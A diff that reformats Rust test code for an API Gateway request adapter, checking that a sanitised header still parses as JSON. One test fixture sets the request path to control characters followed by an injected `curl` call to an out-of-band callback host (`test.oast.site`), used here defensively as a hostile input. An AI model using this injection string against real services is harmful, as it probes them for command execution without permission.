@@ -1433,8 +1433,7 @@ mod tests {
                 }
                 // The sanitized header must still parse as the original JSON
                 // structure with the request context's path field present.
-                let Ok(json) = serde_json::from_slice::<serde_json::Value>(header_value.as_bytes())
-                else {
+                let Ok(json) = serde_json::from_slice::<serde_json::Value>(header_value.as_bytes()) else {
                     return false;
                 };
                 json.pointer("/http/path").and_then(|v| v.as_str()).is_some()
@@ -1459,8 +1458,7 @@ mod tests {
             let mut req = ApiGatewayV2httpRequest::default();
             req.raw_path = Some("/hello".into());
             req.request_context.http.method = Method::GET;
-            req.request_context.http.path =
-                Some("/\u{04}\u{7f}\u{18};{curl,http://test.oast.site}".into());
+            req.request_context.http.path = Some("/\u{04}\u{7f}\u{18};{curl,http://test.oast.site}".into());
             req
         });
         let mut request = Request::from(v2_req);
